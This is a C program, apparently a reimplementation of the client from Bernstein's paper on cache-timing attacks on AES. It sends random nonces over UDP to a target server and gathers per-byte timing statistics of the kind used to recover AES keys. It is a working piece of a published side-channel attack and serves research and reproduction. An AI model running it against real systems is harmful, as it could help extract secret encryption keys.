/**
 * Original code from paper:
 *    Cache-timing attacks on AES
 * By:
 *    Daniel J. BERNSTEIN
 *    Department of Mathematics, Statistics, and Computer Science (M/C 249)
 *    The University of Illinois at Chicago
 *    Chicago, IL 60607–7045
 *    djb@cr.yp.to
 *
 */

#include <stdint.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdlib.h>
#include <signal.h>
#include <poll.h>
#include <string.h>
#include <stdio.h>
#include <math.h>

#define MAX_MESS_LEN 2048

struct Packet {
    uint8_t nonce[16];  // 16
    uint8_t out[16]; // 16
    uint64_t timestampStart; // 8
    uint64_t timestampEnd;   // 8
}; // 48

int s, messageLen;

double totalPackets = 0.;
double totalTime    = 0.;
double timeArray[16][256]              = {0.};
double meanArray[16][256]              = {0.};
double standardDeviationArray[16][256] = {0.};

long long countArray[16][256] = {0};

char nonceBytes[16];
char messageBuffer[MAX_MESS_LEN];
char responseBuffer[sizeof(struct Packet)];

inline int timeToReport(long long inputs)
{
    return
        inputs >= 10000
        &&
        !(inputs & (inputs - 1)); // if inputs == 2^k
}

void collectByteTimingStatistics(double timing);

void receivePacket();

/*
 * report to stdout follow statistics:
 * - Byte number of Nonce in packet;
 * - Lenght of message;
 * - Byte value of nonce byte number;
 * - Total message for this number and byte value;
 * - Mean timing
 * - Std timing
 * - Mean timing - mean timing for all packet
 * - Std timing - sqrt of total mess
 */
void report();

int main(int argc, char **argv)
{
    if (!argv[1]) {
        return 100;
    }

    struct sockaddr_in server;

    if (!inet_aton(argv[1], &server.sin_addr)) {
        return 100;
    }

    server.sin_family = AF_INET;
    server.sin_port = htons(10000);

    if (!argv[2]) {
        return 100;
    }

    messageLen = atoi(argv[2]);

    if (messageLen < 16 || messageLen > sizeof messageBuffer) {
        fprintf(stderr, "Mess len must be >= 16 and <= %d", MAX_MESS_LEN);
        return 100;
    }

    while ((s = socket(AF_INET, SOCK_DGRAM, 0)) == -1) {
        sleep(1);
    }

    while (connect(s, (struct sockaddr *)&server, sizeof server) == -1) {
        sleep(1);
    }

    long long inputs = 0;

    for (;;) {
        receivePacket();
        ++inputs;
        if (timeToReport(inputs)) {
            report();
        }
    }
}


void collectByteTimingStatistics(double timing)
{
    for (int byteValue, byteNumber = 0; byteNumber < 16; ++byteNumber) {

        byteValue = 255 & nonceBytes[byteNumber];
        ++totalPackets;
        totalTime += timing;

        // summary timing for the num nonce and byte value
        timeArray[byteNumber][byteValue] += timing;

        standardDeviationArray[byteNumber][byteValue] += (timing * timing);

        // total packet localy (num, value)
        ++(countArray[byteNumber][byteValue]);
    }
}


void receivePacket()
{
    uint64_t start, end, timing;
    int byteNumber;

    struct pollfd p;

    for (;;) {

        for (byteNumber = 0; byteNumber < 16; ++byteNumber) {
            nonceBytes[byteNumber] = messageBuffer[byteNumber] = random();
        }

        for (; byteNumber < messageLen; ++byteNumber) {
            messageBuffer[byteNumber] = random();
        }

        send(s, messageBuffer, messageLen, 0);
        p.fd = s;
        p.events = POLLIN;

        if (poll(&p, 1, 100) <= 0) {
            continue;
        }

        while (p.revents & POLLIN) {
            if (recv(s, responseBuffer, sizeof responseBuffer, 0) == sizeof responseBuffer) {
                // same nonces
                if (!memcmp(messageBuffer, responseBuffer, 16)) {
                    start = ((struct Packet*)responseBuffer)->timestampStart;
                    end = ((struct Packet*)responseBuffer)->timestampEnd;
                    timing = end - start;
                    if (timing < 20000) {
                        collectByteTimingStatistics(timing);
                        return;
                    }
                }
            }
            if (poll(&p, 1, 0) <= 0) {
                break;
            }
        }
    }
}


void report()
{
    double timeOnPacketAvg = totalTime / totalPackets;
    int byteValue, byteNumber;

    for (byteNumber = 0; byteNumber < 16; ++byteNumber) {
        for (byteValue = 0; byteValue < 256; ++byteValue) {

            meanArray[byteNumber][byteValue]
                = timeArray[byteNumber][byteValue] / countArray[byteNumber][byteValue];

            standardDeviationArray[byteNumber][byteValue]
                = standardDeviationArray[byteNumber][byteValue] / countArray[byteNumber][byteValue];

            standardDeviationArray[byteNumber][byteValue]
                -= (meanArray[byteNumber][byteValue] * meanArray[byteNumber][byteValue]);

            standardDeviationArray[byteNumber][byteValue]
                = sqrt(standardDeviationArray[byteNumber][byteValue]);
        }
    }

    for (byteNumber = 0; byteNumber < 16; ++byteNumber) {
        for (byteValue = 0; byteValue < 256; ++byteValue) {
            printf("%2d %4d %3d %lld %.3f %.3f %.6f %.6f\n",
                byteNumber, messageLen, byteValue,
                countArray[byteNumber][byteValue],
                meanArray[byteNumber][byteValue],
                standardDeviationArray[byteNumber][byteValue],
                meanArray[byteNumber][byteValue] - timeOnPacketAvg,
                standardDeviationArray[byteNumber][byteValue] / sqrt(countArray[byteNumber][byteValue])
            );
        }
    }
    fflush(stdout);
}


